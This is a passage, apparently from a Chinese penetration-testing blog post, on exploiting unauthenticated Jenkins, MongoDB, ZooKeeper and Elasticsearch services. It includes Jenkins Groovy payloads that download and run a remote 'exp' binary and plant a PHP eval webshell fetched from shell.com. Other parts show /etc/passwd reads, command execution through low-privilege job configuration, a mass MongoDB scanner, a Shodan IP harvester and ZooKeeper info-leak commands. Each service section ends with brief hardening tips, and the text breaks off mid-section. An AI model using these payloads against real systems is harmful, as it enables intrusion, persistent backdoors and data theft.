+<p>弱口令扫描:<a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a> 或者 <a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a><br />
+From: <a href="https://www.secpulse.com/archives/2166.html">https://www.secpulse.com/archives/2166.html</a><br />
+CVE-2017-1000353:<a href="https://blogs.securiteam.com/index.php/archives/3171">https://blogs.securiteam.com/index.php/archives/3171</a><br />
+提示: script/manage 是管理页面<br />
+<img src="https://img.04z.net/img/evi1ox_2018-04-28_00-46-47.jpg" alt="" /></p>
+
+<h2 id="2-攻击利用"><strong>2.攻击利用</strong></h2>
+
+<p><strong>2.1 反弹shell</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">println &#34;wget http://192.168.3.131:8081/exp -P /tmp/&#34;.execute().text
+println &#34;chmod +x /tmp/exp&#34;.execute().text
+println &#34;/tmp/exp&#34;.execute().text</pre></td></tr></table>
+</div>
+</div>
+<p>或者直接通过 Terminal+Plugin<br />
+<a href="https://wiki.jenkins.io/display/JENKINS/Terminal+Plugin">https://wiki.jenkins.io/display/JENKINS/Terminal+Plugin</a></p>
+
+<p><strong>2.2 写webshell</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">1. println &#34;wget http://shell.com/shell.txt -P /var/www/html/&#34;.execute().text
+
+2. new File(&#34;/var/www/html/shell.php&#34;).write(&#39;&lt;?php @eval($_POST[shell]);?&gt;&#39;);
+
+3.
+def webshell = &#39;&lt;?php @eval($_POST[shell]);?&gt;&#39;
+new File(&#34;/var/www/html/shell.php&#34;).write(&#34;$webshell&#34;);
+
+4.
+def execute(cmd) {
+def proc = cmd.execute()
+proc.waitFor()
+}
+execute( [ &#39;bash&#39;, &#39;-c&#39;, &#39;echo -n &#34;&lt;?php @eval($&#34; &gt; /var/www/html/shell.php&#39; ] )
+execute( [ &#39;bash&#39;, &#39;-c&#39;, &#39;echo &#34;_POST[shell]);?&gt;&#34; &gt;&gt; /var/www/html/shell.php&#39; ] )
+//参数-n 不要在最后自动换行</pre></td></tr></table>
+</div>
+</div>
+<p><strong>2.3 读文件</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">try{
+
+text = new File(&#34;/etc/passwd&#34;).getText();
+
+out.print text
+
+} catch(Exception e){
+
+}</pre></td></tr></table>
+</div>
+</div>
+<p><strong>2.4 执行命令</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">def sout = new StringBuilder(), serr = new StringBuilder()
+def proc = &#39;cat /etc/passwd&#39;.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println &#34;out&gt; $sout err&gt; $serr&#34;</pre></td></tr></table>
+</div>
+</div>
+<p><strong>回显注意点</strong><br />
+* Result: 0 表示成功写入<br />
+* Result: 1 表示目录不存在或者权限不足 写入失败<br />
+* Result: 2 表示构造有异常 写入失败</p>
+
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-28_01-08-04.jpg" alt="" /></p>
+
+<p>jenkins可以对每个用户分配不同的权限，如Overall/RunScripts或者Job/Configure权限<br />
+某些版本匿名用户可以访问asynchPeople 可爆破密码（通常很多密码跟用户名一样或者是其他弱口令(top1000)，尤其是内网）</p>
+
+<h2 id="3-模拟低权限"><strong>3.模拟低权限</strong></h2>
+
+<p><strong>省略掉注册并且安装plugin的傻瓜式操作</strong></p>
+
+<p>默认安装的情况下，匿名用户是没有任何权限的，这里修改配置，让匿名用户只拥有 查看Job、Job Configure 权限</p>
+
+<p>1.点击 管理(Manage Jenkins) - Configure Global Security</p>
+
+<p>2.在 添加用户/组(User/group to add): 填入当前登录的用户名，然后点击 Add，移到最右侧，点击 ✔️，让用户拥有所有权限<br />
+此步非常重要，不然保存后会导致 admin is missing the Overall/Read permission 错误,如下图所示<br />
+<img src="https://img.04z.net/img/evi1ox_2018-04-28_09-43-07.jpg" alt="" /></p>
+
+<p>3.然后访问 <a href="http://127.0.0.1:8080/newJob">http://127.0.0.1:8080/newJob</a> ,名称填 Test，类型选择 构建一个自由风格的软件项目(Freestyle project )后点击 Save,如下图所示代表创建成功<br />
+<img src="https://img.04z.net/img/evi1ox_2018-04-28_09-45-24.jpg" alt="" /></p>
+
+<p>4.新建一个无痕窗口,通过匿名访问看到有配置权限<br />
+<img src="https://img.04z.net/img/evi1ox_2018-04-28_10-03-55.jpg" alt="" /><br />
+点击 配置(Configure)，在 Build 部分选择 Execute shell</p>
+
+<p>在 Command 中填入要执行的命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">id
+uname -a
+cat /etc/passwd</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-28_10-52-01.jpg" alt="" /></p>
+
+<p>5.通过查看 Configure 页面的选项，得知在 构建触发器(Build Triggers) 部分可以设置任务 Build 的触发规则，其中有一个 Build periodically，可以通过类似 Crontab 时间规则来触发，这里填入  <code>*/1 * * * *</code> 即每分钟执行一次 Build，点击 Save<br />
+<img src="https://img.04z.net/img/evi1ox_2018-04-28_09-54-10.jpg" alt="" /></p>
+
+<p>6.回到 Job 页面，等待一会，在左侧 Build History 可以看到，每分钟都会执行一次 Build，这里点击查看 Console Output<br />
+<img src="https://img.04z.net/img/evi1ox_2018-04-28_10-06-05.jpg" alt="" /><br />
+命令执行成功<br />
+<img src="https://img.04z.net/img/evi1ox_2018-04-28_10-47-07.jpg" alt="" /></p>
+
+<p>匿名用户是没有 Build 权限，即 Job 的页面中是没有 立即构建(Build Now) 按钮，所以这里无法通过点击 立即构建 来触发命令的执行。</p>
+
+<h2 id="4-防护措施"><strong>4.防护措施</strong></h2>
+
+<ul>
+<li>在Jenkins管理页面添加访问密码。建议您使用由十位以上数字，字母和特殊符号组成的强密码。<br /></li>
+<li>建议您不要将管理后台开放到互联网上。您可以使用ECS安全组策略设置访问控制，默认策略为拒绝所有通信。您可以根据业务发布情况仅开放* 需要对外用户提供的服务，并控制好访问源IP。<br />
+<br /></li>
+</ul>
+
+<h1 id="0x03-mongodb未授权访问">0x03 MongoDB未授权访问</h1>
+
+<p>MongoDB 默认直接连接，无须身份验证，如果当前机器可以公网访问，且不注意Mongodb 端口（默认 27017）的开放状态，那么Mongodb就会产生安全风险，被利用此配置漏洞，入侵数据库。</p>
+
+<ul>
+<li>使用默认 mongod 命令启动 Mongodb<br /></li>
+<li>机器可以被公网访问<br /></li>
+<li>在公网上开放了 Mongodb 端口<br /></li>
+<li>数据库隐私泄露<br /></li>
+<li>数据库被清空<br /></li>
+<li>数据库运行缓慢<br />
+<br /></li>
+</ul>
+
+<h2 id="1-扫描探测-2"><strong>1.扫描探测</strong></h2>
+
+<p>下载：<a href="http://nmap.org/svn/scripts/mongodb-info.nse">http://nmap.org/svn/scripts/mongodb-info.nse</a><br />
+<code>nmap -p 27017 --script mongodb-info &lt;ip&gt;</code><br />
+<img src="https://img.04z.net/img/evi1ox_2018-05-02_09-17-00.jpg" alt="" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">vim /etc/mongodb.conf
+dbpath = /data/
+logpath = /var/logs/mongodb.log
+#port = 27017
+#fork = true
+bind_ip = 0.0.0.0
+
+./mongod –config mongodb.conf //启动mongodb加载配置mongodb.conf</pre></td></tr></table>
+</div>
+</div>
+<p><strong>1.1 基础</strong><br />
+<a href="https://www.jianshu.com/p/8bf26effa737">https://www.jianshu.com/p/8bf26effa737</a><br />
+<a href="http://www.runoob.com/mongodb/mongodb-tutorial.html">http://www.runoob.com/mongodb/mongodb-tutorial.html</a><br />
+<a href="https://itbilu.com/database/mongo/E1tWQz4_e.html">https://itbilu.com/database/mongo/E1tWQz4_e.html</a></p>
+
+<p><strong>1.2 批量扫描未授权</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">pymongo</span>
+
+<span class="n">ipcons</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">def</span> <span class="nf">Scanner</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">ipcons</span>
+    <span class="n">sk</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">sk</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">sk</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="mi">27017</span><span class="p">))</span>
+        <span class="n">ipcons</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+        <span class="n">sk</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">ip2num</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
+    <span class="n">ip</span><span class="o">=</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ip</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)]</span>
+    <span class="k">return</span> <span class="n">ip</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span><span class="mi">24</span> <span class="o">|</span> <span class="n">ip</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="mi">16</span> <span class="o">|</span> <span class="n">ip</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="mi">8</span> <span class="o">|</span><span class="n">ip</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">num2ip</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s1">&#39;</span><span class="si">%s</span><span class="s1">.</span><span class="si">%s</span><span class="s1">.</span><span class="si">%s</span><span class="s1">.</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span><span class="p">(</span> <span class="p">(</span><span class="n">num</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">)</span> <span class="o">&gt;&gt;</span><span class="mi">24</span><span class="p">,</span>
+                                <span class="p">(</span><span class="n">num</span> <span class="o">&amp;</span> <span class="mh">0x00ff0000</span><span class="p">)</span> <span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">,</span>
+                                <span class="p">(</span><span class="n">num</span> <span class="o">&amp;</span> <span class="mh">0x0000ff00</span><span class="p">)</span> <span class="o">&gt;&gt;</span><span class="mi">8</span><span class="p">,</span>
+                                <span class="n">num</span> <span class="o">&amp;</span> <span class="mh">0x000000ff</span> <span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">get_ip</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
+    <span class="n">start</span><span class="p">,</span><span class="n">end</span> <span class="o">=</span> <span class="p">[</span><span class="n">ip2num</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ip</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span> <span class="p">]</span>
+    <span class="k">return</span> <span class="p">[</span> <span class="n">num2ip</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">start</span><span class="p">,</span><span class="n">end</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="k">if</span> <span class="n">num</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="p">]</span>
+
+<span class="n">startIp</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">endIp</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">iplist</span> <span class="o">=</span> <span class="n">get_ip</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s2">&#34; &#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">iplist</span><span class="p">:</span>
+    <span class="n">Scanner</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">connMon</span><span class="p">(</span><span class="n">ip_addr</span><span class="p">):</span>
+    <span class="k">print</span> <span class="s1">&#39; Connect mongodb: &#39;</span> <span class="o">+</span> <span class="n">ip_addr</span> <span class="o">+</span> <span class="s1">&#39;:27017&#39;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">conn</span> <span class="o">=</span> <span class="n">pymongo</span><span class="o">.</span><span class="n">MongoClient</span><span class="p">(</span><span class="n">ip_addr</span><span class="p">,</span><span class="mi">27017</span><span class="p">,</span><span class="n">socketTimeoutMS</span><span class="o">=</span><span class="mi">3000</span><span class="p">)</span>
+        <span class="n">dbname</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">database_names</span><span class="p">()</span>
+        <span class="k">print</span> <span class="s2">&#34;success&#34;</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s2">&#34;error&#34;</span>
+
+<span class="k">print</span> <span class="n">ipcons</span>
+<span class="k">for</span> <span class="n">ipaddr</span> <span class="ow">in</span> <span class="n">ipcons</span><span class="p">:</span>
+    <span class="n">connMon</span><span class="p">(</span><span class="n">ipaddr</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s2">&#34;=================&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><strong>1.3 shodan扫描脚本</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python</span>
+<span class="c1"># -*- coding: UTF-8 -*-</span>
+<span class="s1">&#39;&#39;&#39;
+</span><span class="s1">@Author：joy_nick
+</span><span class="s1">@博客：http://byd.dropsec.xyz/
+</span><span class="s1">&#39;&#39;&#39;</span>
+<span class="kn">import</span> <span class="nn">shodan</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="n">iplist</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">ip_list</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">shodan_ip_list</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">def</span> <span class="nf">shodanSearch</span><span class="p">(</span><span class="n">keywords</span><span class="p">):</span>
+    <span class="n">SHODAN_API_KEY</span> <span class="o">=</span> <span class="s2">&#34;your key&#34;</span>
+    <span class="n">api</span> <span class="o">=</span> <span class="n">shodan</span><span class="o">.</span><span class="n">Shodan</span><span class="p">(</span><span class="n">SHODAN_API_KEY</span><span class="p">)</span>
+    <span class="n">total</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">results</span> <span class="o">=</span> <span class="n">api</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">keywords</span><span class="p">)</span>
+        <span class="n">total</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">results</span><span class="p">[</span><span class="s1">&#39;total&#39;</span><span class="p">])</span>
+        <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">[</span><span class="s1">&#39;matches&#39;</span><span class="p">]:</span>
+            <span class="c1">#iplist.append({&#34;ip&#34;:result[&#39;ip_str&#39;],&#34;country&#34;:result[&#39;location&#39;][&#39;country_name&#39;]})</span>
+            <span class="n">iplist</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;ip_str&#39;</span><span class="p">])</span>
+            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">iplist</span><span class="p">)):</span>
+                <span class="n">ip_list</span> <span class="o">=</span> <span class="n">iplist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+                <span class="n">shodan_ip_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ip_list</span><span class="p">)</span>
+                <span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">shodan_ip_list</span><span class="p">)</span>
+                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;shodan_ip_list.txt&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">output</span><span class="p">:</span>
+                    <span class="n">output</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">shodan</span><span class="o">.</span><span class="n">APIError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s1">&#39;Error: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">e</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">shodanSearch</span><span class="p">(</span><span class="s1">&#39;redis&#39;</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>查询操作<br />
+<img src="https://img.04z.net/img/20170904235737499.png" alt="" /></p>
+
+<h2 id="2-爆破脚本"><strong>2.爆破脚本</strong></h2>
+
+<p><a href="https://github.com/netxfly/x-crack">https://github.com/netxfly/x-crack</a><br />
+<img src="https://img.04z.net/img/68747470733a2f2f646f63732e787365632e696f2f696d616765732f782d637261636b2f782d637261636b3030322e706e67.png" alt="" /></p>
+
+<h2 id="3-攻击脚本"><strong>3.攻击脚本</strong></h2>
+
+<p><a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a><br />
+<a href="https://www.youtube.com/watch?v=R6-nXCVNxEw">https://www.youtube.com/watch?v=R6-nXCVNxEw</a><br />
+<a href="https://www.youtube.com/watch?v=R6-nXCVNxEw">https://www.youtube.com/watch?v=R6-nXCVNxEw</a></p>
+
+<h2 id="4-防范措施"><strong>4.防范措施</strong></h2>
+
+<p><strong>(1).新建管理账户开启MongoDB授权</strong><br />
+新建终端[参数默认可以不加，若有自定义参数，才要加上，下同]<br />
+<code>mongod --port 27017 --dbpath /data/db1</code></p>
+
+<p>另起一个终端，运行下列命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">mongo --port 27017
+
+  use admin
+
+  db.createUser(
+    {
+      user: &#34;adminUser&#34;,
+      pwd: &#34;adminPass&#34;,
+      roles: [ { role: &#34;userAdminAnyDatabase&#34;, db: &#34;admin&#34; } ]
+    }
+  )</pre></td></tr></table>
+</div>
+</div>
+<p>管理员创建成功，现在拥有了用户管理员 用户名:adminUser 密码:adminPass</p>
+
+<p><img src="https://img.04z.net/img/evi1ox_2018-05-02_09-08-26.jpg" alt="" /></p>
+
+<p><strong>(2).本地访问</strong><br />
+bind 127.0.0.1</p>
+
+<p><strong>(3).修改默认端口</strong><br />
+修改默认的mongoDB端口(默认为: TCP 27017)为其他端口</p>
+
+<p><strong>(4).禁用HTTP和REST端口</strong><br />
+MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface = false<br />
+<strong>(5).开启日志审计功能</strong><br />
+审计功能可以用来记录用户对数据库的所有相关操作。这些记录可以让系统管理员在需要的时候分析数据库在什么时段发生了什么事情<br />
+**(6).开启auth认证 **</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">/etc/mongodb.conf　　
+auth = true　</pre></td></tr></table>
+</div>
+</div>
+<p>其他:<a href="http://www.mottoin.com/105609.html">http://www.mottoin.com/105609.html</a></p>
+
+<h1 id="0x04-zookeeper未授权访问">0x04 ZooKeeper未授权访问</h1>
+
+<p>From: <a href="http://www.polaris-lab.com/index.php/archives/41/">http://www.polaris-lab.com/index.php/archives/41/</a><br />
+<a href="http://www.majunwei.com/category/201612011952003333/">http://www.majunwei.com/category/201612011952003333/</a><br />
+<a href="http://www.mottoin.com/92742.html">http://www.mottoin.com/92742.html</a><br />
+<a href="http://cve.scap.org.cn/CVE-2014-0085.html">http://cve.scap.org.cn/CVE-2014-0085.html</a><br />
+<a href="http://ifeve.com/zookeeper_guidetozkoperations/">http://ifeve.com/zookeeper_guidetozkoperations/</a><br />
+<a href="http://blog.csdn.net/u011721501/article/details/44062617">http://blog.csdn.net/u011721501/article/details/44062617</a></p>
+
+<p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p>
+
+<h2 id="1-扫描探测-3"><strong>1.扫描探测</strong></h2>
+
+<p>ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。<br />
+<code>./zkCli.sh -server  127.0.0.1 2181</code></p>
+
+<p><img src="https://img.04z.net/img/evi1ox_2018-05-02_09-54-05.jpg" alt="" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">nmap -sS -p2181 -oG zookeeper.gnmap 192.168.1.0/24
+grep &#34;Ports: 2181/open/tcp&#34; zookeeper.gnmap | cut -f 2 -d &#39; &#39; &gt; Live.txt</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-05-02_09-51-31.jpg" alt="" /></p>
+
+<h2 id="2-攻击获取信息"><strong>2.攻击获取信息</strong></h2>
+
+<ul>
+<li><p>stat：列出关于性能和连接的客户端的统计信息。<br />
+echo stat |ncat 127.0.0.1 2181</p></li>
+
+<li><p>ruok：测试服务器是否运行在非错误状态。<br />
+echo ruok |ncat 127.0.0.1 2181</p></li>
+
+<li><p>reqs：列出未完成的请求。<br />
+echo reqs |ncat 127.0.0.1 2181</p></li>
+
+<li><p>envi：打印有关服务环境的详细信息。<br />
+echo envi |ncat 127.0.0.1 2181</p></li>
+</ul>
+
+<p>dump：列出未完成的会话和临时节点。<br />
+echo dump |ncat 127.0.0.1 2181</p>
+
+<h2 id="3-防范措施"><strong>3.防范措施</strong></h2>
+
+<ul>
+<li>禁止把Zookeeper直接暴露在公网<br /></li>
+<li>添加访问控制，根据情况选择对应方式（认证用户，用户名密码，指定IP）<br />
+<br /></li>
+</ul>
+
+<h1 id="0x05-elasticsearch未授权访问">0x05 Elasticsearch未授权访问</h1>
+
+<p>ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放HTTP-9200端口，可被非法操作数据。</p>
+
+<h2 id="1-熟悉的响应-you-know-for-search"><strong>1.熟悉的响应</strong> You Know, for Search</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">$ curl http://127.0.0.1:9200/_cat/indices/
+
+{ &#34;status&#34; : 200, &#34;name&#34; : &#34;Flake&#34;, &#34;cluster_name&#34; : &#34;elasticsearch&#34;, &#34;version&#34; : {&#34;number&#34; : &#34;1.4.1&#34;,&#34; &#34;build_hash&#34; : &#34;b88f43fc40b0bcd7f173xxxxx2e97816de80b19&#34;, &#34;build_timestamp&#34; : &#34;2015-07-29T09:54:16Z&#34;, &#34;build_snapshot&#34; : false, &#34;lucene_version&#34; : &#34;4.10.4&#34;}, &#34;tagline&#34; : &#34;You Know, for Search&#34;}</pre></td></tr></table>
+</div>
+</div>
+<h2 id="2-漏洞测试"><strong>2.漏洞测试</strong></h2>
+
+<p>安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。<br />
